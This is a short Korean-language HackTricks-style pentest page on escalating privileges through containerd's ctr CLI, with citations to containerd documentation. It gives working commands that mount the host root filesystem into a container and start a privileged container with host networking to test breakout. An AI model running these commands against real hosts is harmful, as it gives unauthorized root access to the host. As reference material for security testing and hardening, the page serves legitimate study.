# Containerd (ctr) 권한 상승

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

다음 링크에서 **containerd와 `ctr`이 컨테이너 스택에서 어떤 역할을 하는지** 알아보세요:

{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

호스트에 containerd와 함께 번들로 제공되는 native CLI인 `ctr` 명령이 있는 것을 발견했다면:<sup>[[1]](#references)</sup>
```bash
which ctr
/usr/bin/ctr
```
containerd에 알려진 image를 나열할 수 있습니다:<sup>[[2]](#references)</sup>
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
그런 다음 **host root를 container root에 재귀적으로 bind-mounted한 상태로 해당 이미지 중 하나를 실행**합니다:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

privileged mode로 container를 실행하고 escape를 테스트합니다.\
다음과 같이 host networking을 사용하여 privileged container를 실행할 수 있습니다:<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged`는 프로세스에 호출자의 유효 Linux capabilities를 부여하고 여러 격리 제어를 제거하지만, escape 가능 여부는 환경에 따라 달라집니다. 다음 페이지에 언급된 기법을 사용해 이를 테스트하세요:<sup>[[5]](#references)</sup>

{{#ref}}
container-security/
{{#endref}}

## References

- [1] [containerd 시작하기](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [2] [`ctr image` command 구현](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/images/images.go)
- [3] [`ctr run` command 구현](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/run/run.go)
- [4] [Linux kernel shared-subtree 문서](https://docs.kernel.org/filesystems/sharedsubtree.html)
- [5] [containerd OCI package: `WithPrivileged`](https://pkg.go.dev/github.com/containerd/containerd%40v1.7.33/oci)
- [6] [containerd `ctr` command flags](https://github.com/containerd/containerd/blob/main/cmd/ctr/commands/commands.go)
{{#include ../../banners/hacktricks-training.md}}
